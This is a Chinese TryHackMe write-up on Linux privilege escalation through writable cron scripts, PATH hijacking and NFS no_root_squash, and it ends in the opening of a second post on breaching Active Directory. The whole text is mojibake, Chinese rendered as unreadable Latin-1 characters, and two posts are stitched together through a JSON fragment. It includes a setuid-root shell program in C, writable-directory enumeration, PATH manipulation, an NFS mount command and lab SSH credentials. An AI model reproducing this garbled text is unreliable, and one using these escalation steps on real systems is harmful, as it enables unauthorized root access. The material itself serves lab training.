ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥è¯»å– /etc/crontab ä¸‹ä¿å­˜ç³»ç»ŸèŒƒå›´ cron ä½œä¸šçš„æ–‡ä»¶ è™½ç„¶ CTF æœºå™¨å¯ä»¥æ¯åˆ†é’Ÿæˆ–æ¯ 5 åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ cron ä½œä¸šï¼Œä½†åœ¨æ¸—é€æµ‹è¯•æ´»åŠ¨ä¸­ï¼Œæ‚¨ä¼šæ›´ç»å¸¸çœ‹åˆ°æ¯å¤©ã€æ¯å‘¨æˆ–æ¯æœˆè¿è¡Œçš„ä»»åŠ¡ã€‚ è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸‹åˆ—çš„shæ–‡ä»¶éƒ½æ˜¯æ¯ä¸€åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥çœ‹çœ‹æˆ‘ä»¬èƒ½è®¿é—®å“ªäº›æ–‡ä»¶ æµ‹è¯•ä¸€ç•ªå‘ç°åªèƒ½è®¿é—®backup.shæ–‡ä»¶ ç”±äºæˆ‘ä»¬å½“å‰çš„ç”¨æˆ·å¯ä»¥è®¿é—®æ­¤è„šæœ¬ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è½»æ¾ä¿®æ”¹å®ƒä»¥åˆ›å»ºä¸€ä¸ªåå‘ shellï¼Œå¸Œæœ›å…·æœ‰ root æƒé™ã€‚ è¯¥è„šæœ¬å°†ä½¿ç”¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯ç”¨çš„å·¥å…·æ¥å¯åŠ¨åå‘ shellã€‚ éœ€è¦æ³¨æ„çš„ä¸¤ç‚¹ï¼š å‘½ä»¤è¯­æ³•å°†æ ¹æ®å¯ç”¨å·¥å…·çš„ä¸åŒè€Œæœ‰æ‰€ä¸åŒã€‚ ï¼ˆä¾‹å¦‚ nc å¯èƒ½ä¸æ”¯æŒæ‚¨åœ¨å…¶ä»–æƒ…å†µä¸‹ä½¿ç”¨è¿‡çš„ -e é€‰é¡¹ï¼‰ æˆ‘ä»¬åº”è¯¥å§‹ç»ˆå€¾å‘äºå¯åŠ¨åå‘ shellï¼Œå› ä¸ºæˆ‘ä»¬ä¸æƒ³åœ¨çœŸæ­£çš„æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æŸå®³ç³»ç»Ÿçš„å®Œæ•´æ€§ã€‚ è¯¥æ–‡ä»¶åº”å¦‚ä¸‹æ‰€ç¤ºï¼š ç°åœ¨ï¼Œæˆ‘ä»¬å°†åœ¨æ”»å‡»æœºå™¨ä¸Šè¿è¡Œä¸€ä¸ªç›‘å¬å™¨æ¥æ¥æ”¶ä¼ å…¥çš„è¿æ¥ã€‚è¿™é‡Œæˆ‘ä¸€ç›´æ²¡ååº”ï¼Œç»“æœå‘ç°æ˜¯è¯¥shæ–‡ä»¶æ²¡æœ‰xæƒé™ã€‚ã€‚ã€‚ ä¹‹åé¶æœºå¼€å¯ç›‘å¬å³å¯ Crontab å§‹ç»ˆå€¼å¾—æ£€æŸ¥ï¼Œå› ä¸ºå®ƒæœ‰æ—¶ä¼šå¯¼è‡´è½»æ¾çš„æƒé™å‡çº§å‘é‡ã€‚åœ¨ä¸å…·å¤‡ä¸€å®šç½‘ç»œå®‰å…¨æˆç†Ÿåº¦çº§åˆ«çš„å…¬å¸ä¸­ï¼Œä»¥ä¸‹æƒ…å†µå¹¶ä¸å°‘è§ï¼š ç³»ç»Ÿç®¡ç†å‘˜éœ€è¦å®šæœŸè¿è¡Œè„šæœ¬ã€‚ ä»–ä»¬åˆ›å»ºäº†ä¸€ä¸ª cron ä½œä¸šæ¥æ‰§è¡Œæ­¤æ“ä½œ ä¸€æ®µæ—¶é—´åï¼Œè„šæœ¬å˜å¾—æ¯«æ— ç”¨å¤„ï¼Œä»–ä»¬å°†å…¶åˆ é™¤ ä»–ä»¬ä¸æ¸…ç†ç›¸å…³çš„ cron ä½œä¸š æ­¤å˜æ›´ç®¡ç†é—®é¢˜ä¼šå¯¼è‡´åˆ©ç”¨ cron ä½œä¸šçš„æ½œåœ¨æ¼æ´ã€‚ ä¸Šé¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†ç±»ä¼¼çš„æƒ…å†µï¼Œantivirus.sh è„šæœ¬è¢«åˆ é™¤ï¼Œä½† cron ä½œä¸šä»ç„¶å­˜åœ¨ã€‚ å¦‚æœæœªå®šä¹‰è„šæœ¬çš„å®Œæ•´è·¯å¾„ï¼ˆå°±åƒä¸º backup.sh è„šæœ¬æ‰€åšçš„é‚£æ ·ï¼‰ï¼Œcron å°†å¼•ç”¨ /etc/crontab æ–‡ä»¶ä¸­ PATH å˜é‡ä¸‹åˆ—å‡ºçš„è·¯å¾„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿåœ¨ç”¨æˆ·çš„ä¸»æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºâ€œantivirus.shâ€çš„è„šæœ¬ï¼Œå¹¶ä¸”å®ƒåº”è¯¥ç”± cron ä½œä¸šè¿è¡Œã€‚ ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ–‡ä»¶åº”è¯¥çœ‹èµ·æ¥å¾ˆç†Ÿæ‚‰ï¼š ä¼ å…¥çš„åå‘ shell è¿æ¥å…·æœ‰ root æƒé™ï¼š åœ¨å¥‡æ€ªçš„æƒ…å†µä¸‹ï¼Œæ‚¨å‘ç°ç°æœ‰è„šæœ¬æˆ–ä»»åŠ¡é™„åŠ åˆ° cron ä½œä¸šï¼Œæ€»æ˜¯å€¼å¾—èŠ±æ—¶é—´æ¥äº†è§£è„šæœ¬çš„åŠŸèƒ½ä»¥åŠå¦‚ä½•åœ¨ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ä»»ä½•å·¥å…·ã€‚ä¾‹å¦‚ï¼Œtarã€7zã€rsync ç­‰ï¼Œå¯ä»¥åˆ©ç”¨å…¶é€šé…ç¬¦åŠŸèƒ½è¿›è¡Œåˆ©ç”¨ã€‚ æ¥ä¸‹æ¥ä¾ç…§è€æ–¹æ³•ï¼Œåˆ†åˆ«è¯»å–passwdä¸shadowæ–‡ä»¶ï¼Œæœ€åçˆ†ç ´å¯†ç å³å¯ 0x09 ææƒï¼šPATH å¦‚æœæ‚¨çš„ç”¨æˆ·å…·æœ‰å†™å…¥æƒé™çš„æ–‡ä»¶å¤¹ä½äºè·¯å¾„ä¸­ï¼Œæ‚¨å¯èƒ½ä¼šåŠ«æŒåº”ç”¨ç¨‹åºæ¥è¿è¡Œè„šæœ¬ã€‚ Linux ä¸­çš„ PATH æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå‘Šè¯‰æ“ä½œç³»ç»Ÿåœ¨å“ªé‡Œæœç´¢å¯æ‰§è¡Œæ–‡ä»¶ã€‚å¯¹äºä»»ä½•æœªå†…ç½®åˆ° shell ä¸­æˆ–æœªä½¿ç”¨ç»å¯¹è·¯å¾„å®šä¹‰çš„å‘½ä»¤ï¼ŒLinux å°†å¼€å§‹åœ¨ PATH ä¸‹å®šä¹‰çš„æ–‡ä»¶å¤¹ä¸­æœç´¢ã€‚ ï¼ˆPATHæ˜¯æˆ‘ä»¬è¿™é‡Œè®¨è®ºçš„ç¯å¢ƒå˜é‡ï¼Œpathæ˜¯æ–‡ä»¶çš„ä½ç½®ï¼‰ã€‚ é€šå¸¸ï¼ŒPATH çœ‹èµ·æ¥åƒè¿™æ ·ï¼š å¦‚æœæˆ‘ä»¬åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥â€œthmâ€ï¼ŒLinux å°†åœ¨è¿™äº›ä½ç½®æŸ¥æ‰¾åä¸º thm çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸‹é¢çš„åœºæ™¯å°†ä½¿æ‚¨æ›´å¥½åœ°äº†è§£å¦‚ä½•åˆ©ç”¨å®ƒæ¥æé«˜æˆ‘ä»¬çš„ç‰¹æƒçº§åˆ«ã€‚æ­£å¦‚æ‚¨å°†çœ‹åˆ°çš„ï¼Œè¿™å®Œå…¨å–å†³äºç›®æ ‡ç³»ç»Ÿçš„ç°æœ‰é…ç½®ï¼Œå› æ­¤åœ¨å°è¯•æ­¤æ“ä½œä¹‹å‰ï¼Œè¯·ç¡®ä¿æ‚¨å¯ä»¥å›ç­”ä»¥ä¸‹é—®é¢˜ã€‚ $PATH ä¸‹æœ‰å“ªäº›æ–‡ä»¶å¤¹ æ‚¨å½“å‰çš„ç”¨æˆ·æ˜¯å¦å…·æœ‰è¿™äº›æ–‡ä»¶å¤¹çš„å†™å…¥æƒé™ï¼Ÿ å¯ä»¥ä¿®æ”¹$PATHå—ï¼Ÿ æ‚¨å¯ä»¥å¯åŠ¨çš„è„šæœ¬/åº”ç”¨ç¨‹åºæ˜¯å¦ä¼šå—åˆ°æ­¤æ¼æ´çš„å½±å“ï¼Ÿ å‡ºäºæ¼”ç¤ºç›®çš„ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ï¼š è¯¥è„šæœ¬å°è¯•å¯åŠ¨ä¸€ä¸ªåä¸ºâ€œthmâ€çš„ç³»ç»ŸäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†è¯¥ç¤ºä¾‹å¯ä»¥è½»æ¾åœ°ç”¨ä»»ä½•äºŒè¿›åˆ¶æ–‡ä»¶å¤åˆ¶ã€‚ æˆ‘ä»¬å°†å…¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶å¹¶è®¾ç½® SUID ä½ã€‚ æˆ‘ä»¬çš„ç”¨æˆ·ç°åœ¨å¯ä»¥è®¿é—®è®¾ç½®äº† SUID ä½çš„â€œpathâ€è„šæœ¬ã€‚ æ‰§è¡Œåï¼Œâ€œpathâ€å°†åœ¨ PATH ä¸‹åˆ—å‡ºçš„æ–‡ä»¶å¤¹ä¸­æŸ¥æ‰¾åä¸ºâ€œthmâ€çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ å¦‚æœ PATH ä¸‹åˆ—å‡ºäº†ä»»ä½•å¯å†™æ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º thm çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶è®©æˆ‘ä»¬çš„â€œpathâ€è„šæœ¬è¿è¡Œå®ƒã€‚è®¾ç½® SUID ä½åï¼Œè¯¥äºŒè¿›åˆ¶æ–‡ä»¶å°†ä»¥ root æƒé™è¿è¡Œ å¯ä»¥ä½¿ç”¨â€œ find / -writable 2&gt;/dev/null â€å‘½ä»¤å®Œæˆå¯¹å¯å†™æ–‡ä»¶å¤¹çš„ç®€å•æœç´¢ã€‚å¯ä»¥ä½¿ç”¨ç®€å•çš„å‰ªåˆ‡å’Œæ’åºåºåˆ—æ¥æ¸…ç†æ­¤å‘½ä»¤çš„è¾“å‡ºã€‚ æŸäº› CTF åœºæ™¯å¯ä»¥å‘ˆç°ä¸åŒçš„æ–‡ä»¶å¤¹ï¼Œä½†å¸¸è§„ç³»ç»Ÿä¼šè¾“å‡ºç±»ä¼¼äºæˆ‘ä»¬ä¸Šé¢çœ‹åˆ°çš„å†…å®¹ã€‚ å°†å…¶ä¸ PATH è¿›è¡Œæ¯”è¾ƒå°†å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°å¯ä»¥ä½¿ç”¨çš„æ–‡ä»¶å¤¹ã€‚ æˆ‘ä»¬åœ¨ /usr ä¸‹çœ‹åˆ°è®¸å¤šæ–‡ä»¶å¤¹ï¼Œå› æ­¤å†æ¬¡è¿è¡Œå¯å†™æ–‡ä»¶å¤¹æœç´¢ä»¥è¦†ç›–å­æ–‡ä»¶å¤¹å¯èƒ½ä¼šæ›´å®¹æ˜“ã€‚ å¦ä¸€ç§é€‰æ‹©æ˜¯ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ã€‚ find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u æˆ‘ä»¬æ·»åŠ äº†â€œgrep -v procâ€æ¥æ¶ˆé™¤ä¸è¿è¡Œè¿›ç¨‹ç›¸å…³çš„è®¸å¤šç»“æœã€‚ ä¸å¹¸çš„æ˜¯ï¼Œ/usrä¸‹çš„å­æ–‡ä»¶å¤¹ä¸å¯å†™ æ›´å®¹æ˜“å†™å…¥çš„æ–‡ä»¶å¤¹å¯èƒ½æ˜¯ /tmpã€‚æ­¤æ—¶ï¼Œç”±äº PATH ä¸­ä¸å­˜åœ¨ /tmpï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ·»åŠ å®ƒã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œâ€œ export PATH=/tmp:$PATH â€å‘½ä»¤å®Œæˆäº†è¿™ä¸€ä»»åŠ¡ã€‚ æ­¤æ—¶ï¼Œè·¯å¾„è„šæœ¬è¿˜å°†åœ¨ /tmp æ–‡ä»¶å¤¹ä¸‹æŸ¥æ‰¾åä¸ºâ€œthmâ€çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ é€šè¿‡å°† /bin/bash ä½œä¸ºâ€œthmâ€å¤åˆ¶åˆ° /tmp æ–‡ä»¶å¤¹ä¸‹ï¼Œåˆ›å»ºæ­¤å‘½ä»¤ç›¸å½“å®¹æ˜“ã€‚ æˆ‘ä»¬å·²ç»ä¸º /bin/bash çš„å‰¯æœ¬æˆäºˆäº†å¯æ‰§è¡Œæƒé™ï¼Œè¯·æ³¨æ„ï¼Œæ­¤æ—¶å®ƒå°†ä»¥æˆ‘ä»¬çš„ç”¨æˆ·æƒé™è¿è¡Œã€‚åœ¨æ­¤ä¸Šä¸‹æ–‡ä¸­ï¼Œä½¿æƒé™å‡çº§æˆä¸ºå¯èƒ½çš„åŸå› æ˜¯è·¯å¾„è„šæœ¬ä»¥ root æƒé™è¿è¡Œã€‚ find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u ä½¿ç”¨ä¸Šè¿°å‘½ä»¤å‘ç°äº†ä¼—å¤šå¯æ‰§è¡Œæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­å¯ç–‘çš„ä¸ºï¼šhome/murdoch å¯ä»¥çœ‹åˆ°å…¶ä¸­åŒ…å«testå’Œthm.pyæ–‡ä»¶ å½“æˆ‘ä»¬å°è¯•è¿è¡Œçš„æ—¶å€™ï¼Œä¼šå‘ç°æ‰¾ä¸åˆ°å‘½ä»¤thmï¼Œé‚£æˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ thmå¯æ‰§è¡Œæ–‡ä»¶ æ¥ç€å°†è¯¥ç›®å½•æ·»åŠ è¿›PATHä¸­ï¼Œæ‰§è¡Œtestå³å¯ 0x10 ææƒï¼šNFS æƒé™å‡çº§å‘é‡ä¸ä»…é™äºå†…éƒ¨è®¿é—®ã€‚å…±äº«æ–‡ä»¶å¤¹å’Œè¿œç¨‹ç®¡ç†ç•Œé¢ï¼ˆä¾‹å¦‚ SSH å’Œ Telnetï¼‰è¿˜å¯ä»¥å¸®åŠ©æ‚¨è·å¾—ç›®æ ‡ç³»ç»Ÿçš„ root è®¿é—®æƒé™ã€‚æœ‰äº›æƒ…å†µè¿˜éœ€è¦ä½¿ç”¨ä¸¤ä¸ªå‘é‡ï¼Œä¾‹å¦‚åœ¨ç›®æ ‡ç³»ç»Ÿä¸ŠæŸ¥æ‰¾ root SSH ç§é’¥ï¼Œå¹¶é€šè¿‡ SSH ä»¥ root æƒé™è¿›è¡Œè¿æ¥ï¼Œè€Œä¸æ˜¯å°è¯•æé«˜å½“å‰ç”¨æˆ·çš„æƒé™çº§åˆ«ã€‚ ä¸ CTF å’Œè€ƒè¯•æ›´ç›¸å…³çš„å¦ä¸€ä¸ªå‘é‡æ˜¯é…ç½®é”™è¯¯çš„ç½‘ç»œ shellã€‚å½“å­˜åœ¨ç½‘ç»œå¤‡ä»½ç³»ç»Ÿæ—¶ï¼Œæœ‰æ—¶å¯ä»¥åœ¨æ¸—é€æµ‹è¯•æœŸé—´çœ‹åˆ°æ­¤å‘é‡ã€‚ NFSï¼ˆç½‘ç»œæ–‡ä»¶å…±äº«ï¼‰é…ç½®ä¿å­˜åœ¨ /etc/exports æ–‡ä»¶ä¸­ã€‚è¯¥æ–‡ä»¶æ˜¯åœ¨ NFS æœåŠ¡å™¨å®‰è£…æœŸé—´åˆ›å»ºçš„ï¼Œé€šå¸¸å¯ä¾›ç”¨æˆ·è¯»å–ã€‚ æ­¤æƒé™å‡çº§å‘é‡çš„å…³é”®å…ƒç´ æ˜¯æ‚¨åœ¨ä¸Šé¢çœ‹åˆ°çš„â€œno_root_squashâ€é€‰é¡¹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒNFS ä¼šå°† root ç”¨æˆ·æ›´æ”¹ä¸º nfsnobodyï¼Œå¹¶ç¦æ­¢ä»¥ root æƒé™æ“ä½œä»»ä½•æ–‡ä»¶ã€‚å¦‚æœå¯å†™å…±äº«ä¸Šå­˜åœ¨â€œno_root_squashâ€é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªè®¾ç½®äº† SUID ä½çš„å¯æ‰§è¡Œæ–‡ä»¶å¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œå®ƒã€‚ æˆ‘ä»¬å°†é¦–å…ˆæšä¸¾æ”»å‡»æœºå™¨ä¸Šçš„å¯å®‰è£…å…±äº«ã€‚ æˆ‘ä»¬å°†æŠŠâ€œno_root_squashâ€å…±äº«ä¹‹ä¸€å®‰è£…åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºå™¨ä¸Šå¹¶å¼€å§‹æ„å»ºæˆ‘ä»¬çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ mount -o rw 10.10.104.35:/home/ubuntu/sharedfolder /tmp/sharedfolder ç”±äºæˆ‘ä»¬å¯ä»¥è®¾ç½® SUID ä½ï¼Œå› æ­¤åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œ /bin/bash çš„ç®€å•å¯æ‰§è¡Œæ–‡ä»¶å°†å®Œæˆè¿™é¡¹å·¥ä½œã€‚ #include&lt;stdlib.h&gt; #include&lt;stdio.h&gt; #include&lt;unistd.h&gt; int main(){ setgid(0); setuid(0); system(\"/bin/bash\"); return 0; } ç¼–è¯‘ä»£ç åï¼Œæˆ‘ä»¬å°†è®¾ç½® SUID ä½ã€‚ æ‚¨å°†åœ¨ä¸‹é¢çœ‹åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼ˆnfs.c å’Œ nfs éƒ½å­˜åœ¨äºç›®æ ‡ç³»ç»Ÿä¸Šã€‚æˆ‘ä»¬å·²ç»å¤„ç†äº†å·²å®‰è£…çš„å…±äº«ï¼Œå› æ­¤æ— éœ€ä¼ è¾“å®ƒä»¬ï¼‰ã€‚ æˆ‘ä»¬åœ¨é¶æœºä¸Šä¹Ÿå¯ä»¥çœ‹åˆ°è¿™æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œä½†æ‰§è¡Œä¹‹åå´çˆ†å‡ºgccç¼–è¯‘é”™è¯¯ è¿™ä¸ªé—®é¢˜ä¼¼ä¹æ— æ³•å¾—åˆ°è§£å†³ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘çš„kaliæœºä¸é¶æœºglibcç‰ˆæœ¬ä¸åŒ¹é…å¯¼è‡´çš„ï¼Œè¿™é‡Œå°±åªèƒ½æ¸…æ¥šæ€è·¯äº† ä½†æˆ‘ä»¬è¿è¡Œnfséœ€è¦2.34ï¼Œè€Œä¸”å½“å‰ç”¨æˆ·ä¸æ˜¯rootæ— æ³•å‡çº§glibc 0x11 æŒ‘æˆ˜ åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ‚¨å·²ç»å¯¹ Linux ä¸Šçš„ä¸»è¦æƒé™å‡çº§å‘é‡æœ‰äº†ç›¸å½“å¥½çš„äº†è§£ï¼Œå¹¶ä¸”è¿™ä¸ªæŒ‘æˆ˜åº”è¯¥ç›¸å½“å®¹æ˜“ã€‚ æ‚¨å·²è·å¾—å¯¹å¤§å‹ç§‘å­¦è®¾æ–½çš„ SSH è®¿é—®æƒé™ã€‚å°è¯•æå‡æ‚¨çš„æƒé™ï¼Œç›´åˆ°æˆä¸º Root ä¸ºæ­¢ã€‚ æˆ‘ä»¬è®¾è®¡è¿™ä¸ªæˆ¿é—´æ˜¯ä¸ºäº†å¸®åŠ©æ‚¨æ„å»ºä¸€ä¸ªå…¨é¢çš„ Linux æƒé™å‡çº§æ–¹æ³•ï¼Œè¿™åœ¨ OSCP å’Œæ¸—é€æµ‹è¯•ç­‰è€ƒè¯•ä¸­éå¸¸æœ‰ç”¨ã€‚ ä¸è¦ä¸æ¢ç´¢ä»»ä½•ç‰¹æƒå‡çº§å‘é‡ï¼Œç‰¹æƒå‡çº§é€šå¸¸æ›´åƒæ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œè€Œä¸æ˜¯ä¸€é—¨ç§‘å­¦ã€‚ æ‚¨å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®ç›®æ ‡è®¡ç®—æœºæˆ–ä½¿ç”¨ä¸‹é¢çš„ SSH å‡­æ®ã€‚ Username: leonard Password: Penny123 é“¾æ¥ä¹‹åå°±æ˜¯ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œå‘ç°ä¸å­˜åœ¨nfsã€å†…æ ¸æ¼æ´çš„åˆ©ç”¨å¯èƒ½ã€‚æ¥ç€çœ‹äº†ä¸€ä¸‹sudoå‘½ä»¤ å‘ç°æœ‰findå¯ä»¥åˆ©ç”¨ï¼Œç›´æ¥ä¸Šå‘½ä»¤å³å¯ ä¹‹åå°±æ˜¯æ‰¾å¯»flagçš„æ—…ç¨‹","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-å…¥ä¾µAD","path":"/2024/02/09/thm-ru-qin-ad/","content":"0x01 ç®€ä»‹ å¤§çº¦ 90% çš„å…¨çƒè´¢å¯Œ 1000 å¼ºå…¬å¸ä½¿ç”¨ Active Directory (AD)ã€‚å¦‚æœä¸€ä¸ªç»„ç»‡çš„èµ„äº§ä½¿ç”¨ Microsoft Windowsï¼Œé‚£ä¹ˆæ‚¨å‡ ä¹è‚¯å®šä¼šæ‰¾åˆ° ADã€‚ Microsoft AD æ˜¯ç”¨äºç®¡ç† Windows åŸŸç½‘ç»œçš„ä¸»å¯¼å¥—ä»¶ã€‚ç„¶è€Œï¼Œç”±äºADç”¨äºæ•´ä¸ªäº§ä¸šçš„èº«ä»½å’Œè®¿é—®ç®¡ç†ï¼Œå®ƒæŒæ¡ç€ç‹å›½çš„é’¥åŒ™ï¼Œä½¿å…¶å¾ˆå¯èƒ½æˆä¸ºæ”»å‡»è€…çš„ç›®æ ‡ã€‚ Breaching Active Directory åœ¨æˆ‘ä»¬åˆ©ç”¨ AD é”™è¯¯é…ç½®è¿›è¡Œæƒé™æå‡ã€æ¨ªå‘ç§»åŠ¨å’Œç›®æ ‡æ‰§è¡Œä¹‹å‰ï¼Œæ‚¨é¦–å…ˆéœ€è¦åˆå§‹è®¿é—®æƒé™ã€‚æ‚¨éœ€è¦è·å–ä¸€ç»„åˆå§‹çš„æœ‰æ•ˆ AD å‡­æ®ã€‚ç”±äº AD æœåŠ¡å’ŒåŠŸèƒ½çš„æ•°é‡ä¼—å¤šï¼Œè·å–ä¸€ç»„åˆå§‹ AD å‡­æ®çš„æ”»å‡»é¢é€šå¸¸å¾ˆå¤§ã€‚åœ¨è¿™ä¸ªæˆ¿é—´é‡Œï¼Œæˆ‘ä»¬å°†è®¨è®ºå‡ ç§é€”å¾„ï¼Œä½†è¿™ç»ä¸æ˜¯è¯¦å°½çš„åˆ—è¡¨ã€‚ åœ¨æŸ¥æ‰¾ç¬¬ä¸€ç»„å‡­æ®æ—¶ï¼Œæˆ‘ä»¬ä¸ä¼šå…³æ³¨ä¸å¸æˆ·å…³è”çš„æƒé™ï¼›è€Œæ˜¯å…³æ³¨ä¸å¸æˆ·ç›¸å…³çš„æƒé™ã€‚å› æ­¤ï¼Œå³ä½¿æ˜¯ä½æƒé™å¸æˆ·ä¹Ÿè¶³å¤Ÿäº†ã€‚æˆ‘ä»¬åªæ˜¯åœ¨å¯»æ‰¾ä¸€ç§å¯¹ AD è¿›è¡Œèº«ä»½éªŒè¯çš„æ–¹æ³•ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿå¯¹ AD æœ¬èº«è¿›è¡Œè¿›ä¸€æ­¥çš„æšä¸¾ã€‚ Learning Objectives åœ¨è¿™ä¸ªç½‘ç»œä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»å‡ ç§å¯ç”¨äºå…¥ä¾µ AD çš„æ–¹æ³•ã€‚è¿™ç»ä¸æ˜¯å®Œæ•´çš„åˆ—è¡¨ï¼Œå› ä¸ºæ¯å¤©éƒ½ä¼šå‘ç°æ–°çš„æ–¹æ³•å’ŒæŠ€æœ¯ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä»¥ä¸‹æŠ€æœ¯æ¥æ¢å¤æ­¤ç½‘ç»œä¸­çš„ AD å‡­æ®ï¼š NTLM è®¤è¯æœåŠ¡ LDAP ç»‘å®šå‡­è¯ Authentication Relays è®¤è¯ä¸­ç»§ å¾®è½¯éƒ¨ç½²å·¥å…·åŒ… Configuration Files é…ç½®æ–‡ä»¶ æˆ‘ä»¬å¯ä»¥é€šè¿‡é’ˆå¯¹é¢å‘äº’è”ç½‘çš„ç»„ç»‡çš„ç³»ç»Ÿæˆ–é€šè¿‡åœ¨ç»„ç»‡çš„ç½‘ç»œä¸Šæ¤å…¥æ¶æ„è®¾å¤‡æ¥ä½¿ç”¨è¿™äº›æŠ€æœ¯è¿›è¡Œå®‰å…¨è¯„ä¼°ã€‚ 0x02 OSINT å’Œç½‘ç»œé’“é±¼ è·å–ç¬¬ä¸€ç»„ AD å‡­æ®çš„ä¸¤ç§æµè¡Œæ–¹æ³•æ˜¯å¼€æºæƒ…æŠ¥ (OSINT) å’Œç½‘ç»œé’“é±¼ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œä»…ç®€å•æåŠè¿™ä¸¤ç§æ–¹æ³•ï¼Œå› ä¸ºå®ƒä»¬å·²ç»åœ¨å…¶ä»–æˆ¿é—´ä¸­è¿›è¡Œäº†æ›´æ·±å…¥çš„ä»‹ç»ã€‚ OSINT å¼€æºæƒ…æŠ¥ OSINT ç”¨äºå‘ç°å·²å…¬å¼€æŠ«éœ²çš„ä¿¡æ¯ã€‚å°± AD å‡­æ®è€Œè¨€ï¼Œå‘ç”Ÿè¿™ç§æƒ…å†µçš„åŸå› æœ‰å¤šç§ï¼Œä¾‹å¦‚ï¼š åœ¨ Stack Overflow ç­‰å…¬å…±è®ºå›ä¸Šæé—®ä½†åœ¨é—®é¢˜ä¸­æŠ«éœ²æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚å‡­æ®ï¼‰çš„ç”¨æˆ·ã€‚ ä½¿ç”¨ç¡¬ç¼–ç å‡­æ®å°†è„šæœ¬ä¸Šä¼ åˆ° Github ç­‰æœåŠ¡çš„å¼€å‘äººå‘˜ã€‚ ç”±äºå‘˜å·¥ä½¿ç”¨å…¶å·¥ä½œå¸æˆ·æ³¨å†Œå…¶ä»–å¤–éƒ¨ç½‘ç«™ï¼Œå› æ­¤åœ¨è¿‡å»çš„è¿è§„è¡Œä¸ºä¸­ï¼Œå‡­è¯è¢«æ³„éœ²ã€‚ HaveIBeenPwned å’Œ DeHashed ç­‰ç½‘ç«™æä¾›äº†å‡ºè‰²çš„å¹³å°ï¼Œå¯ä»¥ç¡®å®šæŸäººçš„ä¿¡æ¯ï¼ˆä¾‹å¦‚å·¥ä½œç”µå­é‚®ä»¶ï¼‰æ˜¯å¦æ›¾ç»æ¶‰åŠå…¬å¼€çš„æ•°æ®æ³„éœ²äº‹ä»¶ã€‚ é€šè¿‡ä½¿ç”¨ OSINT æŠ€æœ¯ï¼Œæœ‰å¯èƒ½æ¢å¤å…¬å¼€æŠ«éœ²çš„å‡­æ®ã€‚å¦‚æœæˆ‘ä»¬è¶³å¤Ÿå¹¸è¿æ‰¾åˆ°å‡­è¯ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥æµ‹è¯•å®ƒä»¬æ˜¯å¦æœ‰æ•ˆï¼Œå› ä¸º OSINT ä¿¡æ¯å¯èƒ½ä¼šè¿‡æ—¶ã€‚åœ¨ä»»åŠ¡ 3 ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®º NTLM èº«ä»½éªŒè¯æœåŠ¡ï¼Œå®ƒå¯èƒ½æä¾›ä¸€ä¸ªæå¥½çš„é€”å¾„æ¥æµ‹è¯•å‡­æ®ä»¥æŸ¥çœ‹å®ƒä»¬æ˜¯å¦ä»ç„¶æœ‰æ•ˆã€‚ A detailed room on Red Team OSINT can be found here. å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°æœ‰å…³çº¢é˜Ÿ OSINT çš„è¯¦ç»†æˆ¿é—´ã€‚ Phishing ç½‘ç»œé’“é±¼æ˜¯å¦ä¸€ç§ç ´å AD 